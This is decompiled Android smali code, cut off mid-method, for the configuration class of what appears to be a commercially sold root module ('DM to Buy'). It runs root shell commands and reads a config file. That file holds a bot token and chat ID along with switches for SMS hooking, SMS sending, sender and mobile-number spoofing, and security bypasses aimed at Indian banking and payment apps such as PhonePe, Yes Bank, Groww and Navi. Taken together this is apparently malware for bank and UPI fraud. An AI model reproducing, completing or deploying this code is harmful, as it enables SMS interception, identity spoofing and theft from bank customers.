.class public Lcom/rebel/module/ConfigManager;
.super Ljava/lang/Object;
.source "ConfigManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/rebel/module/ConfigManager$ConfigData;
    }
.end annotation


# instance fields
.field public volatile cacheValid:Z

.field public final configCache:Ljava/util/concurrent/atomic/AtomicReference;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/atomic/AtomicReference<",
            "Lcom/rebel/module/ConfigManager$ConfigData;",
            ">;"
        }
    .end annotation
.end field

.field public volatile lastFileModified:J

.field public final lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;


# direct methods
.method public constructor <init>()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 162
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 16
    new-instance v0, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {v0}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V

    iput-object v0, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    .line 17
    new-instance v0, Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-direct {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;-><init>()V

    iput-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    .line 18
    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J

    .line 19
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    .line 163
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->ensureConfigFileExists()V

    .line 164
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    .line 165
    return-void
.end method

.method public static encodeAuthToken()Ljava/lang/String;
    .locals 5

    .line 815
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    .line 816
    .local v0, "ts":J
    const-wide/32 v2, 0x5a3c7e1d

    xor-long/2addr v2, v0

    .line 817
    .local v2, "encoded":J
    invoke-static {v2, v3}, Ljava/lang/Long;->toHexString(J)Ljava/lang/String;

    move-result-object v4

    return-object v4
.end method


# virtual methods
.method public c0xa3f1d7e2()Ljava/lang/String;
    .locals 1

    .line 261
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->sender_id:Ljava/lang/String;

    return-object v0
.end method

.method public c0xb8e4c6a9()Ljava/lang/String;
    .locals 1

    .line 265
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_body:Ljava/lang/String;

    return-object v0
.end method

.method public final ensureConfigFileExists()V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 169
    const-string v0, "/data/local/tmp/src_module_config.json"

    :try_start_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 170
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const-string v3, "chmod 666 "

    if-eqz v2, :cond_0

    .line 171
    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->escapeShellArg(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->runAsRoot(Ljava/lang/String;)Z

    .line 172
    return-void

    .line 174
    :cond_0
    invoke-virtual {v1}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v2

    .line 175
    .local v2, "parentFile":Ljava/io/File;
    if-eqz v2, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->mkdirs()Z

    move-result v4

    if-nez v4, :cond_1

    .line 179
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "mkdir -p "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p0, v5}, Lcom/rebel/module/ConfigManager;->escapeShellArg(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v4}, Lcom/rebel/module/ConfigManager;->runAsRoot(Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 182
    :cond_1
    :try_start_2
    invoke-virtual {v1}, Ljava/io/File;->createNewFile()Z
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 187
    goto :goto_0

    .line 183
    :catch_0
    move-exception v4

    .line 186
    .local v4, "e":Ljava/io/IOException;
    :try_start_3
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "touch "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->escapeShellArg(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p0, v5}, Lcom/rebel/module/ConfigManager;->runAsRoot(Ljava/lang/String;)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 189
    .end local v4    # "e":Ljava/io/IOException;
    :goto_0
    const/4 v4, 0x0

    const/4 v5, 0x1

    :try_start_4
    invoke-virtual {v1, v5, v4}, Ljava/io/File;->setReadable(ZZ)Z

    .line 190
    invoke-virtual {v1, v5, v4}, Ljava/io/File;->setWritable(ZZ)Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 192
    goto :goto_1

    .line 191
    :catch_1
    move-exception v4

    .line 193
    :goto_1
    :try_start_5
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->escapeShellArg(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->runAsRoot(Ljava/lang/String;)Z

    .line 194
    new-instance v0, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v0}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>()V

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    .line 198
    nop

    .end local v1    # "file":Ljava/io/File;
    .end local v2    # "parentFile":Ljava/io/File;
    goto :goto_2

    .line 195
    :catch_2
    move-exception v0

    .line 199
    :goto_2
    return-void
.end method

.method public final escapeShellArg(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "str"    # Ljava/lang/String;

    .line 202
    if-nez p1, :cond_0

    .line 203
    const-string v0, "\'\'"

    return-object v0

    .line 205
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "\'"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "\'\"\'\"\'"

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getBotToken()Ljava/lang/String;
    .locals 1

    .line 209
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->bot_token:Ljava/lang/String;

    return-object v0
.end method

.method public final getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;
    .locals 6

    .line 213
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->lock()V

    .line 215
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/rebel/module/ConfigManager$ConfigData;

    .line 216
    .local v0, "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-boolean v1, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    if-eqz v1, :cond_0

    if-eqz v0, :cond_0

    .line 217
    new-instance v1, Ljava/io/File;

    const-string v2, "/data/local/tmp/src_module_config.json"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 218
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->lastModified()J

    move-result-wide v2

    iget-wide v4, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    cmp-long v2, v2, v4

    if-gtz v2, :cond_0

    .line 219
    nop

    .line 225
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 219
    return-object v0

    .line 222
    .end local v1    # "file":Ljava/io/File;
    :cond_0
    :try_start_1
    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 223
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 225
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 223
    return-object v1

    .line 225
    .end local v0    # "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 226
    throw v0
.end method

.method public final getCappedConfig()Lcom/rebel/module/ConfigManager$ConfigData;
    .locals 6

    .line 230
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->lock()V

    .line 232
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/rebel/module/ConfigManager$ConfigData;

    .line 233
    .local v0, "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-boolean v1, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    if-eqz v1, :cond_0

    if-eqz v0, :cond_0

    .line 234
    new-instance v1, Ljava/io/File;

    const-string v2, "/data/local/tmp/src_module_config.json"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 235
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 236
    invoke-virtual {v1}, Ljava/io/File;->lastModified()J

    move-result-wide v2

    iget-wide v4, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    cmp-long v2, v2, v4

    if-gtz v2, :cond_0

    .line 237
    nop

    .line 244
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 237
    return-object v0

    .line 241
    .end local v1    # "file":Ljava/io/File;
    :cond_0
    :try_start_1
    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 242
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 244
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 242
    return-object v1

    .line 244
    .end local v0    # "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;->unlock()V

    .line 245
    throw v0
.end method

.method public getChatId()Ljava/lang/String;
    .locals 1

    .line 249
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->chat_id:Ljava/lang/String;

    return-object v0
.end method

.method public getFooterText()Ljava/lang/String;
    .locals 2

    .line 269
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->footer_text:Ljava/lang/String;

    .line 270
    .local v0, "ft":Ljava/lang/String;
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    move-object v1, v0

    goto :goto_0

    :cond_0
    const-string v1, "Module by @ParentGuard_Owner | DM to Buy"

    :goto_0
    return-object v1
.end method

.method public getGrowwMobileNo()Ljava/lang/String;
    .locals 1

    .line 453
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCappedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->groww_mobile_no:Ljava/lang/String;

    return-object v0
.end method

.method public getMobileNo()Ljava/lang/String;
    .locals 1

    .line 253
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCappedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->mobile_no:Ljava/lang/String;

    return-object v0
.end method

.method public getRegistredDevice()Ljava/lang/String;
    .locals 1

    .line 257
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->registred_id:Ljava/lang/String;

    return-object v0
.end method

.method public getTimerMultiplier()I
    .locals 1

    .line 935
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->timer_multiplier:I

    return v0
.end method

.method public getVerificationDelay()I
    .locals 1

    .line 931
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->verification_delay:I

    return v0
.end method

.method public isFixAirtelEnabled()Z
    .locals 1

    .line 427
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_airtel:Z

    return v0
.end method

.method public isFixEsafEnabled()Z
    .locals 1

    .line 382
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf:Z

    return v0
.end method

.method public isFixEsafNativeEnabled()Z
    .locals 1

    .line 397
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf_native:Z

    return v0
.end method

.method public isFixGrowwEnabled()Z
    .locals 1

    .line 378
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_groww:Z

    return v0
.end method

.method public isFixKreditBeeEnabled()Z
    .locals 1

    .line 321
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_kreditbee:Z

    return v0
.end method

.method public isFixNaviEnabled()Z
    .locals 1

    .line 302
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_navi:Z

    return v0
.end method

.method public isFixPhonePeEnabled()Z
    .locals 1

    .line 317
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_phonepe:Z

    return v0
.end method

.method public isFixZaggEnabled()Z
    .locals 1

    .line 412
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zagg:Z

    return v0
.end method

.method public isFixZetEnabled()Z
    .locals 1

    .line 325
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zet:Z

    return v0
.end method

.method public isGmsSenderEnabled()Z
    .locals 1

    .line 274
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->gms_sender:Z

    return v0
.end method

.method public isHookSmsEnabled()Z
    .locals 1

    .line 278
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->hook_sms:Z

    return v0
.end method

.method public isLoggedIn()Z
    .locals 1

    .line 282
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->isRoot:Ljava/lang/String;

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-object v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->isRoot:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method public isSmsHooking2Enabled()Z
    .locals 1

    .line 479
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->sms_hooking_2:Z

    return v0
.end method

.method public isSmsSenderEnabled()Z
    .locals 1

    .line 286
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->sms_sender:Z

    return v0
.end method

.method public isSpoofDirectionEnabled()Z
    .locals 1

    .line 290
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_direction:Z

    return v0
.end method

.method public isSpoofMobileEnabled()Z
    .locals 1

    .line 294
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCappedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_mobile:Z

    return v0
.end method

.method public isSpoofSenderEnabled()Z
    .locals 1

    .line 298
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_sender:Z

    return v0
.end method

.method public isSuperMoneyBypassEnabled()Z
    .locals 1

    .line 363
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->supermoney_bypass:Z

    return v0
.end method

.method public isYesBankBypassEnabled()Z
    .locals 1

    .line 494
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->yesbank_bypass:Z

    return v0
.end method

.method public isZetSecurityBypassEnabled()Z
    .locals 1

    .line 348
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->zet_security_bypass:Z

    return v0
.end method

.method public isZetSrcPrefixEnabled()Z
    .locals 1

    .line 344
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->zet_src_prefix:Z

    return v0
.end method

.method public isZetUpiEnabled()Z
    .locals 1

    .line 340
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    iget-boolean v0, v0, Lcom/rebel/module/ConfigManager$ConfigData;->zet_upi:Z

    return v0
.end method

.method public readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;
    .locals 8

    .line 520
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/rebel/module/ConfigManager$ConfigData;

    .line 521
    .local v0, "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    new-instance v1, Ljava/io/File;

    const-string v2, "/data/local/tmp/src_module_config.json"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 522
    .local v1, "file":Ljava/io/File;
    iget-boolean v2, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    if-eqz v2, :cond_0

    if-eqz v0, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->lastModified()J

    move-result-wide v2

    iget-wide v4, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J

